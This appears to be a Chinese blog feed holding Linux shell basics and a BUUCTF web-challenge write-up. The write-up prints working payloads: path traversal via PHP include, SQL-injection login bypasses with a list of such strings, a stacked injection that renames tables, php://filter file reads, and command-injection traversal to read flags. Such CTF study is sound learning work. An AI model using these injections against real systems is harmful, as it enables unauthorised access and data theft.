<code>q</code>。</p><p>你可以用更少的时间做很多其他的事情，但一件有用的事情是能够搜索。您可以搜索<code>/banana</code>以查找文件中“香蕉”的所有实例。</p><h4 id="2-5-3-查看部分文件"><a href="#2-5-3-查看部分文件" class="headerlink" title="2.5.3 查看部分文件"></a>2.5.3 查看部分文件</h4><ol><li><p><strong><code>tail</code>命令</strong><br>tail命令会显示文件最后几行的内容（文件的“尾部”）。默认情况下，它会显示文件的末尾10行。  可以向tail命令中加入-n参数来修改所显示的行数:  <code>tail -2 text</code> 。</p></li><li><p><strong><code>head</code>命令</strong>  </p><p>head命令，顾名思义，会显示文件开头那些行的内容。默认情况下，它会显示文件前10行的文本。同理可以加入 -n 参数指定行数。 </p></li></ol><hr><p>本章的学习就到这啦，下章将继续讨论bash shell的命令，并了解更多管理Linux系统时经常用到的高级系统管理命令。  </p><p><font color="#FF9999" size="2">文章参考：Linux命令行与shell脚本编程大全.第2版 by 布鲁姆，布雷斯纳汉 (z-lib.org)</font></p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux2/202201151928218.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf练习</title>
      <link href="/posts/myh10004.html"/>
      <url>/posts/myh10004.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-HCTF-2018-Warmup"><a href="#1-HCTF-2018-Warmup" class="headerlink" title="1.[HCTF 2018]Warmup"></a>1.[HCTF 2018]Warmup</h2><p>考察：php审计：mb_substr()+mb_strpos()绕过</p><p>打开题目地址后出现的是一个滑稽的表情，接着查看原码发现注释有 source.php ，访问后得到一段源码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">emmm</span>    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$page</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token double-quoted-string string">"source"</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token double-quoted-string string">"source.php"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"hint"</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token double-quoted-string string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//白名单</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token double-quoted-string string">"you can't see it"</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'?'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$_page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$_page</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'?'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"you can't see it"</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> emmm<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">//需要同时满足三个条件：传入了file参数，并且是字符串，并且满足checkfile函数</span>    <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//执行给出的file参数值</span>        <span class="token keyword">exit</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token delimiter important">?&gt;</span></span> flag{408cfb51-0d75-4976-9d2e-e431e5d0fd77}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先来介绍下两个函数mb_substr()+mb_strpos()：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">**mb_strpos()**：返回要查找的字符串在别一个字符串中首次出现的位置    mb_strpos(    string $haystack,    string $needle,):int// haystack：要被检查的字符串。// needle：要搜索的字符串**mb_substr()** 函数返回字符串的一部分。    mb_substr(    string $str,    int $start,    int $length = NULL,):string//str 必需。从该 string 中提取子字符串。//start 必需。规定在字符串的何处开始。//ength 可选。规定要返回的字符串长度。默认是直到字符串的结尾request() //可以以get或者post提交参数include //文件包含,包含并运行文件中的内容$_page . '?' //将$_page后拼接 ? public static function checkFile(&amp;$page)&amp;&amp; emmm::checkFile($_REQUEST['file'])上面这代码表示 将request的file值 传入$page，其实就是将file参数传入到page中&amp;引用传递变量。这是通过在函数内建立一个本地变量并且该变量在呼叫范围内引用了同一个内容来实现的。例如： <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">function</span> sub <span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$var</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$var</span><span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">;</span>    <span class="token function">sub</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>将使 $num 变成 6。这是因为在 sub 函数中变量 $var 指向了和 $num 指向的同一个内容。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​    通过源码提示hin.php，访问之后得到flag在ffffllllaaaagggg中，所以我们肯定要使include包含这个文件，从而得到我们的flag。但是通过checkfile函数可知，返回true的条件是所传入的file参数值（或者是经过函数处理后的值）需要在白名单里，所以直接传入ffffllllaaaagggg肯定不得行。这是最终要的来啦，<strong>就是考虑题目给的函数，通过函数的处理的值使得我们能够返回true</strong>。所以构造payload为：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token number">1.</span>file<span class="token operator">=</span>source<span class="token punctuation">.</span>php<span class="token operator">?</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>ffffllllaaaagggg<span class="token number">2.</span>file<span class="token operator">=</span>source<span class="token punctuation">.</span>php<span class="token operator">%</span><span class="token number">3</span>f<span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>ffffllllaaaagggg <span class="token comment">//这里的%3f是 ? 经过ulr加密后的值，由于每次传参十，都会自动urldecode一次，所以等价于第一个</span><span class="token number">3.</span>file<span class="token operator">=</span>source<span class="token punctuation">.</span>php<span class="token operator">%</span><span class="token number">253</span>f<span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>ffffllllaaaagggg <span class="token comment">//这里的%253f是 ? 经过两次ulr加密后的值，在经过一次自动处理以及checkfile函数里的urldecode函数处理一次后就等价于第一个了，同样可以返回true</span>    <span class="token comment">//说明一下../是返回上一级目录，首先在source.php?加一个 / ，使其成为不存在的目录，然后../就返回到source.php所在的目录，之后一次次试在哪个目录里，自己也可以在本地试试../的目录关系</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>之后传入payload就会得到flag啦~</p><p><strong>再补充一下 ./   ../   / 的说明：</strong></p><pre class="line-numbers language-none"><code class="language-none">./ 表示当前目录下../ 表示上一级目录/ 表示根目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948708.png" style="zoom:150%;"><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948710.png" style="zoom:150%;"><p>如图，以这个文件夹为例，在buu文件中，有2.png，那就表示为</p><pre class="line-numbers language-none"><code class="language-none">./buuctf练习/1.png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在此目录下，有hello.md，那就表示为：</p><pre class="line-numbers language-none"><code class="language-none">./hello.md 或者 hello.md<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果2.png在上层目录的一个image文件下，那就是：</p><pre class="line-numbers language-none"><code class="language-none">../image/1.png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="2-极客大挑战-2019-EasySQL"><a href="#2-极客大挑战-2019-EasySQL" class="headerlink" title="2.[极客大挑战 2019]EasySQL"></a>2.[极客大挑战 2019]EasySQL</h2><p>根据题目提示是SQL注入，所以先试着判断注入点和引号闭合方式：在username输入：1’，密码随便输：1，出现语法报错：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948711.png"></p><p>则可以知道是单引号闭合，接着开始试试万能密码：1’ or 1=1#     ,则输入后后台语句大致就是：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select * from table_name where username='1' or 1=1 # ' and password='1' ;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>由于#会把后面的都注释掉，所以就等价于：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select * from table_name where username='1' or 1=1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可知 1=1 是个恒等式，所以就登陆成功了，得到flag~</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948712.png"></p><p>下面收集一些万能密码：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">'or'='or''or 1=1--''or 1=1--'or'a'='a"or "a"="a"or"="a'='a ')or('a'='aor 1=1--a'or' 1=1--"or"="a'='a'or''='1 or '1'='1'=11 or '1'='1' or 1=1'OR 1=1%00"or 1=1%00'xoradmin' or 'a'='a 密码随便<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="3-极客大挑战-2019-Havefun"><a href="#3-极客大挑战-2019-Havefun" class="headerlink" title="3.[极客大挑战 2019]Havefun"></a>3.[极客大挑战 2019]Havefun</h2><p>这题还是比较简单的哈，进去之后就是一张可爱的猫猫图，有点乖哈哈，查看网页源代码，发现有一段PHP代码，就是get型参数传入：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948713.png"></p><p>然后构造payload为：<a href="http://49122460-5b04-4fd8-b15c-e5fad13e769c.node4.buuoj.cn:81/?cat=dog%E5%B0%B1%E5%8F%AF%E4%BB%A5%E4%BA%86">http://49122460-5b04-4fd8-b15c-e5fad13e769c.node4.buuoj.cn:81/?cat=dog就可以了</a>~</p><hr><h2 id="4-ACTF2020-新生赛-Include"><a href="#4-ACTF2020-新生赛-Include" class="headerlink" title="4.[ACTF2020 新生赛]Include"></a>4.[ACTF2020 新生赛]Include</h2><p>从题目可以看出来考察的是文件包含，进入题目看到tip，点击，网页进行了跳转，此时发现url为：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948714.png"></p><p>可以看到后面有get型参数file值传入，此时传入参数后回显为这句话，那我们就直接通过==<strong>php://filter伪协议</strong>==读取整个flag.php，构造payload为：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948715.png"></p><p>可以看到有一串base64加密的编码，解密后得到flag：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"Can you find out the flag?"</span><span class="token punctuation">;</span><span class="token comment">//flag{0f1d073a-d716-4aa6-ae19-16dbba744a1d}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h2 id="5-强网杯-2019-随便注"><a href="#5-强网杯-2019-随便注" class="headerlink" title="5.[强网杯 2019]随便注"></a>5.[强网杯 2019]随便注</h2><p>从题目知应该是SQL注入，进入题目看到有一个输入框，输入 1 ，正常返回，加个<strong>单引号 1’</strong> 返回SQL语句错误，即存在SQL注入</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948716.png"></p><p>然后使用order by 2,order by 3 查看列数，发现<strong>只有两列</strong></p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948717.png"></p><p>尝试使用联合查询union select 发现回显语是<strong>select被正则过滤</strong>了</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948718.png"></p><p>emmm,开始大小写、联合注释等绕过waf,但是没得用就很气呦……，后来查了下资料原来是忽略掉的<font color="#FF5E3A" size="4">堆叠注入！</font>，那就开始直接查看表名：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1';show tables; --+//在SQL中，分号（;）是用来表示一条sql语句的结束。堆叠注入就是结束一个sql语句后，会继续执行下一条构造的SQL语句。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948719.png"></p><p>然后对应查看对应的列名：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1';show columns from words; --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948720.png"></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1';show columns from `1919810931114514`; --+   //字符串为表名操作时要加反引号<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948721.png"></p><p>这里可以看到我们要的flag是在对应的表中，根据第一次输入 1 的结果来看后台的语句应该是:</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select * from words where id = <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>所以我们目前最重要的就是从另一个表中获得数据，但是我们只能从 “word” 这个表里取数据，然后看了别人的文章发现还可以<strong>改表的名称</strong>来读flag! 所以，思路就很清晰了：</p><ol><li>更改表的名称。将words改为随便其他的名字比如words1，然后将”1919810931114514”表的名字替换为words</li><li>给新的words表增加一列id</li></ol><p>构造payload为（提醒：<font color="#FF5E3A" size="4"> 字符串为表名操作时要加反引号！！！</font>）：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1';rename table words to word1;rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key; --+//这里使用了rename和alert，具体用法可以查一下，不在正则过滤的范围内//注意一定要使用反引号！<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>接着再查看下表，其实就已经查出来flag了，啊tql，学到了~</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948722.png"></p><p>最后感谢有人复现让我学习：<a href="https://github.com/CTFTraining/qwb_2019_supersqli">https://github.com/CTFTraining/qwb_2019_supersqli</a></p><hr><h2 id="6-SUCTF-2019-EasySQL"><a href="#6-SUCTF-2019-EasySQL" class="headerlink" title="6.[SUCTF 2019]EasySQL"></a>6.[SUCTF 2019]EasySQL</h2><p>这题给我整不会了，刚开始试了联合不行，也没报错，报错注入也没了，布尔、时间也不得行了，又是看别人解题的一次，原来还可以猜后端代码:惊恐:。</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select $_GET['query'] || flag from flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后构造payload为：*,1(或者其他常数)</p><p>我接着自己在本地的test数据库尝试了一下，直接构造：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select 1 from salaries;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201171042456.png" style="zoom:150%;"><p>确实<strong>直接 select 一个常数会直接新增一个临时的列，并且每一行的数值都是这个常数</strong>，再来说一下这个 || ，在mysql里，<strong>只要 || 前面的成立，后面的便不再执行</strong>，同理，前面的不成立会执行后面的 。如果我们直接构造 :</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select *||salary from salaries<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201171042458.png"></p><p>可以看到会报语法错误，所以最终就是大佬的构造方法：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select *,1||salary from salaries<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201171042459.png" style="zoom:150%;"><p>可以看到新增加了一列并且这个表中的数据也都显示出来了，大佬们牛批！最后解题拿flag：</p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201171042460.png" style="zoom:150%;"><h2 id="7-ACTF2020-新生赛-Exec"><a href="#7-ACTF2020-新生赛-Exec" class="headerlink" title="7.[ACTF2020 新生赛]Exec"></a>7.[ACTF2020 新生赛]Exec</h2><p>考察的是<strong>远程命令执行</strong>，emm我也是第一次做这种题，百度了一下网站的ping漏洞，发现可能存在远程执行命令的漏洞，就开始尝试~</p><p>首先讲几个知识点：</p><ul><li><p><strong>命令连接符</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cmd1 <span class="token punctuation">;</span> cmd2 <span class="token punctuation">;</span> cmd3         分号 <span class="token punctuation">;</span> 可以进行多条命令的无关联执行，每一条执行结果不会影响其他命令的执行cmd1 <span class="token operator">&amp;&amp;</span> cmd2               左边的command1执行成功<span class="token punctuation">(</span>返回0表示成功<span class="token punctuation">)</span>后，  <span class="token operator">&amp;&amp;</span>  右边的command2才能被执行。cmd1 <span class="token operator">|</span> cmd2                <span class="token operator">|</span> 表示管道，上一条命令的输出，作为下一条命令的输入cmd1 <span class="token operator">||</span> cmd2               <span class="token operator">||</span> 表示上一条命令执行失败后，才执行下一条命令<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>下面开始做题：</p><p>首先<code>ls</code>查看一下当前目录有没有flag文件等，发现没得：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201171042461.png"></p><p>然后尝试遍历父目录可以看到有flag文件：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201171042462.png"></p><p>这样直接<code>cat ../../../flag</code>拿到flag:</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201171042463.png"></p><h2 id="8-极客大挑战-2019-Secret-File"><a href="#8-极客大挑战-2019-Secret-File" class="headerlink" title="8.[极客大挑战 2019]Secret File"></a>8.[极客大挑战 2019]Secret File</h2><p>考察的是<strong>伪协议读取文件</strong>，难点就是怎么读到flag.php中的flag。</p><p>进入题目查看源代码发现提示有：/Archive_room.php ，接着点发现有：/action.php ，但是访问直接过去了跳到：/end.php，开始抓包：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201171145471.png"></p><p>发现有secr3t.php，访问之后看到一段代码：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>secret<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token prolog">&lt;?php    highlight_file(__FILE__);    error_reporting(0);    $file=$_GET['file'];    if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){        echo "Oh no!";        exit();    }    include($file); //flag放在了flag.php里?&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接访问flag.php会出现贱贱的话，看不到flag，看到php代码里有过滤的，先解释下这两个函数：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">strstr</span><span class="token punctuation">(</span>string<span class="token punctuation">,</span>search<span class="token punctuation">,</span>before_search<span class="token punctuation">)</span>搜索字符串在另一字符串中的第一次出现。返回字符串的剩余部分（从匹配点）。如果未找到所搜索的字符串，则返回 <span class="token boolean constant">FALSE</span>。 <span class="token function">stristr</span><span class="token punctuation">(</span>string<span class="token punctuation">,</span>search<span class="token punctuation">,</span>before_search<span class="token punctuation">)</span>    不区分大小写的strstr（）版本。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看到过滤了input、data，是伪协议里的，那就考虑filter读取文件，构造payload:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=flag.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>页面返回flag.php的源码，解密后看到flag：<code>flag{b3f2f2c1-5e4f-4b48-8bc5-1cf85ef574b2}</code></p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201171145473.png"></p><hr><p>最后吐槽一下自己，看了warmup题，看好长时间不会，哎，还是太菜了，慢慢学吧~</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948723.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buu练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux学习-第一章</title>
      <link href="/posts/myh10002.html"/>
      <url>/posts/myh10002.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="第一章：初识Linux"><a href="#第一章：初识Linux" class="headerlink" title="第一章：初识Linux"></a>第一章：初识Linux</h2><h3 id="1-1-shell"><a href="#1-1-shell" class="headerlink" title="1.1 shell"></a>1.1 shell</h3><p>​         Linux shell是一种特殊的<font color="#FF5E3A" size="4">交互式工具</font>。它为用户提供了启动程序、管理文件系统中的文件以及运行在Linux系统上的进程的途径。 shell的<font color="#FF5E3A" size="4">核心是命令行提示符</font>。命令行提示符是shell负责交互的部分。它允许你<strong>输入文本命令，然后解释命令，并在内核中执行</strong>。  </p><p>​        shell包含了一组内部命令，用这些命令可以完成诸如复制文件、移动文件、重命名文件、显示和终止系统中正运行的程序等操作。 shell也允许你在命令行提示符中输入程序的名称，它会将程序名传递给内核以启动它。</p><p>​        也可以将<strong>多个shell命令放入文件中</strong>作为程序执行，这些文件被称作<strong>shell脚本</strong>。你在命令行上执行的任何命令都可放进一个shell脚本中作为一组命令执行。这为创建那种需要把几个命令放在一起来工作的工具提供了便利。</p><p>​        linux有好几种版本的shell，默认的是bash shell。</p><h3 id="1-2-Linux系统分类"><a href="#1-2-Linux系统分类" class="headerlink" title="1.2 Linux系统分类"></a>1.2 Linux系统分类</h3><p>​        Linux主要的系统可以分为两类：<strong>Debian</strong>和<strong>Redhat</strong>，话有一些其他的自由发布的版本。</p><p>​        Debian系列主要有Debian、Ubuntu等。</p><p>​        Redhat系列主要有Redhat、CentOs等。</p><p>​        <strong>不同的系统版本某些命令可能是不一样的</strong>，比如 Debian 使用 <font color="#FF5E3A" size="4">apt-get</font>来安装包，但CentOs使用 <font color="#FF5E3A" size="4">yum</font>。</p><hr><p>第一张就是简要介绍一下什么是linux shell以及常见的发行版本。下一章，将详细讲解shell的使用。</p><p><font color="#FF9999" 